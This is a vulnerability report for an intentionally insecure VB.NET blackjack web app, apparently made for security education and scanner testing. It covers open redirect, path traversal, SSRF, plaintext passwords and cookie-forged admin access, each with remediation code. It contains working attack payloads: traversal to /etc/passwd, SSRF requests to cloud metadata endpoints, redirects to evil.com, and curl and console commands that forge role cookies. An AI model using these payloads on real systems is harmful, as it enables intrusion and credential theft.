# Security Vulnerabilities Report - Blackjack Table Application

> **⚠️ DISCLAIMER:** This application was intentionally built with security vulnerabilities for educational and testing purposes. **DO NOT deploy this to production.**

---

## Table of Contents
1. [Open Redirect](#1-open-redirect-cwe-601)
2. [Path Traversal](#2-path-traversal-cwe-22)
3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf-cwe-918)
4. [Plaintext Password Storage](#4-plaintext-password-storage-cwe-256)
5. [Broken Access Control](#5-broken-access-control-cwe-639)

---

## 1. Open Redirect (CWE-601)

### Description
The `/navigate` endpoint redirects users to any URL without validation, allowing attackers to redirect victims to malicious external sites.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 78-86

```vb
ElseIf path = "/navigate" Then
    Dim urlParam = request.QueryString("url")
    If Not String.IsNullOrEmpty(urlParam) Then
        response.StatusCode = 302
        response.RedirectLocation = urlParam  ' ⚠️ No URL validation
        response.Close()
    Else
        SendResponse(response, "Missing url parameter", 400)
    End If
```

### Attack Vector
```bash
# Redirect to external malicious site
http://localhost:3000/navigate?url=https://evil.com

# Can be used in phishing attacks
http://localhost:3000/navigate?url=http://attacker.com/phishing-page
```

### Impact
- **CVSS Score:** Medium (5.4)
- Phishing attacks
- Credential harvesting
- Malware distribution

### Remediation
```vb
' Whitelist allowed destinations
Dim allowedPaths = New List(Of String) From {"/", "/game", "/chat", "/settings", "/background", "/logs", "/dashboard"}
If allowedPaths.Contains(urlParam) Then
    response.RedirectLocation = urlParam
Else
    SendResponse(response, "Invalid redirect destination", 400)
End If
```

---

## 2. Path Traversal (CWE-22)

### Description
The `/settings/load` endpoint reads files from disk using unsanitized user input, allowing attackers to read arbitrary files on the server.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 88-105

```vb
ElseIf path = "/settings/load" Then
    Dim configName = request.QueryString("config")
    If Not String.IsNullOrEmpty(configName) Then
        Dim configPath = $"configs/{configName}.json"  ' ⚠️ No path sanitization
        If File.Exists(configPath) Then
            Dim jsonContent = File.ReadAllText(configPath)
            ' ... returns file content
```

### Attack Vectors
```bash
# Read the main program file
http://localhost:3000/settings/load?config=../Program

# Traverse multiple directories
http://localhost:3000/settings/load?config=../../../../../../etc/passwd

# Read project files
http://localhost:3000/settings/load?config=../package

# Windows example
http://localhost:3000/settings/load?config=../../Windows/System32/drivers/etc/hosts
```

### Impact
- **CVSS Score:** High (7.5)
- Read sensitive application files
- Access configuration files
- Expose source code
- Read system files (if permissions allow)

### Remediation
```vb
' Sanitize the config name - allow only alphanumeric characters
If Not Regex.IsMatch(configName, "^[a-zA-Z0-9_-]+$") Then
    SendResponse(response, "Invalid config name", 400)
    Return
End If

' Validate the final path stays within configs directory
Dim fullPath = Path.GetFullPath($"configs/{configName}.json")
Dim configsDir = Path.GetFullPath("configs/")
If Not fullPath.StartsWith(configsDir) Then
    SendResponse(response, "Access denied", 403)
    Return
End If
```

---

## 3. Server-Side Request Forgery (SSRF) (CWE-918)

### Description
The `/background/proxy` endpoint fetches any URL provided by the user without validation, allowing attackers to make requests to internal services and scan the internal network.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 794-839

```vb
Sub HandleBackgroundProxy(request As HttpListenerRequest, response As HttpListenerResponse)
    Try
        Dim srcUrl = request.QueryString("src")  ' ⚠️ No URL validation
        If String.IsNullOrEmpty(srcUrl) Then
            SendResponse(response, "Missing src parameter", 400)
            Return
        End If
        
        Console.WriteLine($"Proxying image: {srcUrl}")
        
        ' Fetch the image using HttpClient
        Dim task = httpClient.GetAsync(srcUrl)  ' ⚠️ Fetches ANY URL
        task.Wait()
        Dim httpResponse = task.Result
```

### Attack Vectors

#### 1. Access Internal Services
```bash
# Access the application itself
http://localhost:3000/background/proxy?src=http://localhost:3000/

# Access chat history
http://localhost:3000/background/proxy?src=http://localhost:3000/chat/history

# Bypass authentication on dashboard
http://localhost:3000/background/proxy?src=http://localhost:3000/dashboard
```

#### 2. Port Scanning
```bash
# Scan for MySQL
http://localhost:3000/background/proxy?src=http://localhost:3306

# Scan for PostgreSQL
http://localhost:3000/background/proxy?src=http://localhost:5432

# Scan for Redis
http://localhost:3000/background/proxy?src=http://localhost:6379
```

#### 3. Cloud Metadata Exploitation
```bash
# AWS metadata endpoint
http://localhost:3000/background/proxy?src=http://169.254.169.254/latest/meta-data/

# GCP metadata endpoint
http://localhost:3000/background/proxy?src=http://metadata.google.internal/computeMetadata/v1/

# Azure metadata endpoint
http://localhost:3000/background/proxy?src=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### 4. Internal Network Reconnaissance
```bash
# Scan internal network
http://localhost:3000/background/proxy?src=http://192.168.1.1
http://localhost:3000/background/proxy?src=http://10.0.0.1
http://localhost:3000/background/proxy?src=http://172.16.0.1
```

### Impact
- **CVSS Score:** Critical (9.1)
- Access internal services not exposed to internet
- Bypass firewall restrictions
- Steal cloud credentials (AWS/GCP/Azure)
- Port scan internal network
- Access sensitive internal APIs
- Potential Remote Code Execution on internal services

### Remediation
```vb
' Whitelist allowed protocols
Dim uri As Uri
If Not Uri.TryCreate(srcUrl, UriKind.Absolute, uri) Then
    SendResponse(response, "Invalid URL", 400)
    Return
End If

If uri.Scheme <> "https" Then
    SendResponse(response, "Only HTTPS URLs are allowed", 400)
    Return
End If

' Block internal IP ranges
Dim host = uri.Host
If host = "localhost" OrElse host = "127.0.0.1" OrElse _
   host.StartsWith("192.168.") OrElse host.StartsWith("10.") OrElse _
   host.StartsWith("172.16.") OrElse host = "169.254.169.254" Then
    SendResponse(response, "Access to internal resources denied", 403)
    Return
End If

' Whitelist allowed domains
Dim allowedDomains = New List(Of String) From {"imgur.com", "cdn.example.com"}
If Not allowedDomains.Any(Function(d) host.EndsWith(d)) Then
    SendResponse(response, "Domain not allowed", 403)
    Return
End If
```

---

## 4. Plaintext Password Storage (CWE-256)

### Description
User passwords are stored in memory as plaintext without any hashing or encryption.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 530-534 (Signup) and 578 (Login)

```vb
' Signup handler
Dim newUser As New User With {
    .Username = username,
    .Password = password,  ' ⚠️ Stored as plaintext
    .Role = "player"
}
users.Add(newUser)

' Login handler
Dim user = users.Find(Function(u) u.Username = username And u.Password = password)
```

### Attack Vector
```bash
# Sign up with a test account
curl -X POST http://localhost:3000/signup \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim&password=MySecretPassword123"

# Password is now stored in plaintext in server memory
# Any server compromise exposes all passwords
```

### Impact
- **CVSS Score:** High (7.4)
- Full password exposure on data breach
- No protection if server memory is dumped
- Passwords visible in logs/debugging
- Credential reuse attacks

### Remediation
```vb
Imports System.Security.Cryptography
Imports Microsoft.AspNetCore.Cryptography.KeyDerivation

Function HashPassword(password As String) As String
    ' Generate a salt
    Dim salt(127 / 8 - 1) As Byte
    Using rng As New RNGCryptoServiceProvider()
        rng.GetBytes(salt)
    End Using
    
    ' Hash the password
    Dim hash = KeyDerivation.Pbkdf2(
        password:=password,
        salt:=salt,
        prf:=KeyDerivationPrf.HMACSHA256,
        iterationCount:=10000,
        numBytesRequested:=256 / 8
    )
    
    Return Convert.ToBase64String(salt) & ":" & Convert.ToBase64String(hash)
End Function

' Store hashed password
Dim newUser As New User With {
    .Username = username,
    .Password = HashPassword(password),  ' ✅ Store hash
    .Role = "player"
}
```

---

## 5. Broken Access Control (CWE-639)

### Description
The dealer dashboard checks authorization using a client-controlled cookie value, allowing any user to gain admin access by modifying their cookies.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 869-874

```vb
Sub ServeDashboardPage(request As HttpListenerRequest, response As HttpListenerResponse)
    Dim role = GetCookieValue(request, "role")  ' ⚠️ Reads from client cookie
    
    Dim html As String
    
    If role = "dealer" Then  ' ⚠️ Trusts client-provided value
        ' Show dealer dashboard
```

**Cookie Functions:**
**Lines:** 406-418

```vb
Function GetCookieValue(request As HttpListenerRequest, cookieName As String) As String
    If request.Cookies(cookieName) IsNot Nothing Then
        Return request.Cookies(cookieName).Value  ' ⚠️ No validation
    End If
    Return Nothing
End Function

Sub SetAuthCookie(response As HttpListenerResponse, username As String, role As String)
    Dim userCookie As New Cookie("username", username) With {.Path = "/"}
    Dim roleCookie As New Cookie("role", role) With {.Path = "/"}  ' ⚠️ Client-side role storage
    response.SetCookie(userCookie)
    response.SetCookie(roleCookie)
End Sub
```

### Attack Vectors

#### 1. Browser DevTools Cookie Manipulation
```
Steps:
1. Sign up as regular user: http://localhost:3000/auth
2. Open DevTools (F12) → Application → Cookies
3. Change 'role' cookie from 'player' to 'dealer'
4. Navigate to http://localhost:3000/dashboard
5. ✅ Full admin access granted
```

#### 2. JavaScript Console Attack
```javascript
// Run in browser console at http://localhost:3000/dashboard
document.cookie = "role=dealer; path=/"; 
location.reload();
// ✅ Instant admin access
```

#### 3. curl with Forged Cookies
```bash
# Access dashboard without ever logging in
curl -H "Cookie: role=dealer; username=FakeAdmin" \
  http://localhost:3000/dashboard

# Full dealer dashboard HTML returned ✅
```

#### 4. Automated Privilege Escalation
```bash
# Script to escalate any account
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=normaluser&password=password123" \
  -c cookies.txt

# Modify the cookie file
sed -i 's/role\tplayer/role\tdealer/g' cookies.txt

# Access dealer dashboard with modified cookie
curl -b cookies.txt http://localhost:3000/dashboard
```

### Impact
- **CVSS Score:** Critical (9.1)
- Complete horizontal privilege escalation
- Unauthorized access to admin functions
- Access to sensitive game statistics
- Potential data manipulation
- Bypasses all authentication controls

### Remediation
```vb
' Use server-side session management
Private sessions As New Dictionary(Of String, UserSession)

Class UserSession
    Public Property SessionId As String
    Public Property Username As String
    Public Property Role As String
    Public Property CreatedAt As DateTime
    Public Property LastAccess As DateTime
End Class

Function CreateSession(username As String, role As String) As String
    Dim sessionId = Guid.NewGuid().ToString()
    sessions.Add(sessionId, New UserSession With {
        .SessionId = sessionId,
        .Username = username,
        .Role = role,
        .CreatedAt = DateTime.Now,
        .LastAccess = DateTime.Now
    })
    Return sessionId
End Function

Function ValidateSession(request As HttpListenerRequest) As UserSession
    Dim sessionId = GetCookieValue(request, "session_id")
    If String.IsNullOrEmpty(sessionId) Then Return Nothing
    
    If sessions.ContainsKey(sessionId) Then
        Dim session = sessions(sessionId)
        
        ' Check session expiry (30 minutes)
        If DateTime.Now.Subtract(session.LastAccess).TotalMinutes > 30 Then
            sessions.Remove(sessionId)
            Return Nothing
        End If
        
        session.LastAccess = DateTime.Now
        Return session
    End If
    
    Return Nothing
End Function

Sub ServeDashboardPage(request As HttpListenerRequest, response As HttpListenerResponse)
    Dim session = ValidateSession(request)  ' ✅ Server-side validation
    
    If session Is Nothing OrElse session.Role <> "dealer" Then
        ' Show access denied
        Return
    End If
    
    ' Show dealer dashboard
End Sub
```

---

## Summary of Vulnerabilities

| # | Vulnerability | CVSS | Severity | Lines | Exploitable |
|---|---------------|------|----------|-------|-------------|
| 1 | Open Redirect | 5.4 | Medium | 78-86 | ✅ |
| 2 | Path Traversal | 7.5 | High | 88-105 | ✅ |
| 3 | SSRF | 9.1 | Critical | 794-839 | ✅ |
| 4 | Plaintext Passwords | 7.4 | High | 530-534, 578 | ✅ |
| 5 | Broken Access Control | 9.1 | Critical | 869-874, 406-418 | ✅ |

---

## Testing Environment Setup

### Prerequisites
- .NET 8.0 or .NET 10.0 SDK
- VB.NET support

### Running the Vulnerable Application
```bash
cd /path/to/vb-blackjack-claude
dotnet run
```

Access at: `http://localhost:3000/`

### Default Test Credentials
- **Dealer Account:** username=`dealer`, password=`dealer123`
- **Regular User:** Create via `/auth` page

---

## Responsible Disclosure

This application was created **intentionally with vulnerabilities** for:
- Security testing
- Educational purposes
- Vulnerability scanning tool validation
- Penetration testing practice

**DO NOT:**
- Deploy to production
- Expose to the internet
- Use in any real-world application
- Store real user data

---

## References

- [CWE-601: Open Redirect](https://cwe.mitre.org/data/definitions/601.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-256: Plaintext Password Storage](https://cwe.mitre.org/data/definitions/256.html)
- [CWE-639: Insecure Access Control](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

---

**Generated:** February 15, 2026  
**Application:** Blackjack Table VB.NET Demo  
**Purpose:** Security Research & Education
